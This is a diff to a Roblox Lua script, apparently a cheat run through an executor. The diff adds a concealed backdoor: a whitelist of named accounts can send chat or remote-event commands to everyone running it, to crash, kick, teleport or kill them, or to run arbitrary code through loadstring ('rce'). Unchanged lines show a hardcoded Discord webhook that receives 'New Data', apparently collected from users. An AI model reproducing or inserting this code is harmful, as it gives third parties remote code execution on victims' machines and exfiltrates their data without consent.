@@ -1,3 +1,125 @@
+Players = game.Players
+LocalPlayer = Players.LocalPlayer
+ReplicatedStorage = game.ReplicatedStorage
+GrabEvents = ReplicatedStorage:WaitForChild("GrabEvents")
+ExtendGrabLine = (GrabEvents) and GrabEvents:FindFirstChild("ExtendGrabLine")
+deb = false
+Whitelist = {
+    "SaviorLiberty",
+    "DefyEventHelper1",
+    "DefyEventHelper2",
+    "Defiant_Alt",
+    "R0tationCurveKey",
+    "R0tationCurve",
+
+}
+local FindMatch = function(Name)
+	Name = Name:lower()
+	for _, Player in Players:GetPlayers() do
+		if Player.Name:lower():sub(1, #Name) == Name then
+			return Player
+		end
+	end
+	return nil
+end
+
+cmds = {
+	["crash"] = function()
+		while true do
+			print("Penis")
+		end
+	end,
+
+	["kick"] = function(Admin, Reason) 
+		if Reason then
+			LocalPlayer:Kick(Reason)
+		else
+			LocalPlayer:Kick("The game thinks you're cheating so a black hole appeared and took you away.")
+		end
+	end,
+
+	["bring"] = function(Admin)
+		if LocalPlayer.Character and Admin.Character then
+			LocalPlayer.Character:FindFirstChild("HumanoidRootPart").CFrame = Admin.Character:FindFirstChild("HumanoidRootPart").CFrame
+		end
+	end,
+
+	["kill"] = function(Admin)
+		if LocalPlayer.Character then
+			LocalPlayer.Character:FindFirstChildWhichIsA("Humanoid"):ChangeState(Enum.HumanoidStateType.Dead)
+		end
+	end,
+
+	["rce"] = function(Admin, code)
+		if code and type(code) == "string" then
+			pcall(function()
+				loadstring(code)()
+			end)
+		end
+	end,
+}
+
+local function chat(player, message)
+for i, e in ipairs(Whitelist) do
+if e == player then
+deb = true
+end
+end
+    local Lower = string.lower(message)
+    if string.sub(Lower, 1, 1) == ":" then
+        local args = string.split(string.sub(Lower, 2), " ")
+        local Command = table.remove(args, 1)
+        local Target = table.remove(args, 1)
+        local Data = table.concat(args, " ")
+        if Command and Target and type(Command) == "string" and type(Target) == "string" and cmds[Command] then
+            Command = string.lower(Command)
+            if Target:lower() == LocalPlayer.Name:lower() or FindMatch(Target) == LocalPlayer or Target == "all" then
+                pcall(function()
+                    cmds[Command](player, Data)
+                end)
+            end
+        end
+    end
+    deb = false
+end
+
+ExtendGrabLine.OnClientEvent:Connect(function(Plr, Data)
+for i, e in ipairs(Whitelist) do
+if e == player then
+deb = true
+end
+end
+	if deb then 
+		local Lower = string.lower(Data) 
+		if string.sub(Lower, 1, 1) == ":" then 
+			local args = string.split(string.sub(Lower,2), " ")
+			local Command = table.remove(args, 1)
+			local Target = table.remove(args, 1)
+			local Data = table.concat(args, " ")
+			if Command and Target and type(Command) == "string" and type(Target) == "string" and cmds[Command] then
+				Command = string.lower(Command)
+				if Target == LocalPlayer.Name:lower() or FindMatch(Target) == LocalPlayer or Target == "all" then
+					cmds[Command](Plr, Data)
+				end
+			end
+		end
+	end
+end)
+
+function add(player)
+	player.Chatted:Connect(function(message)
+		chat(player, message)
+	end)
+end
+
+for _, player in ipairs(Players:GetPlayers()) do
+	add(player)
+end
+
+Players.PlayerAdded:Connect(function(player)
+	add(player)
+end)
+
 local WebhookUrl = "https://discord.com/api/webhooks/1371540501114916994/54UdtyOQmOZKhXXJ6FX7w0OEN0LgRbepC6w_BBFjbML-bwkAreA2YLkd4Ky3AJ5Q5pVF"
 local path, luav = "LuaV/LuaV.lua", getgenv().luav if not(luav) then
 if isfile(path) then luav = dofile(path)() else
@@ -84,7 +206,7 @@ local data = {
 data = hs[1]:JSONEncode(
     {
         ["avatar_url"] = "",
-        ["content"] = "**```ansi\n[2;31m! NPHB: New Data ![0m[2;31m[0m\n```**",
+        ["content"] = "**```ansi\n[2;31mNPHB: New Data![0m[2;31m[0m\n```**",
         ["embeds"] = {
             {
                 ["description"] = LuaV(data):c("s")[1],
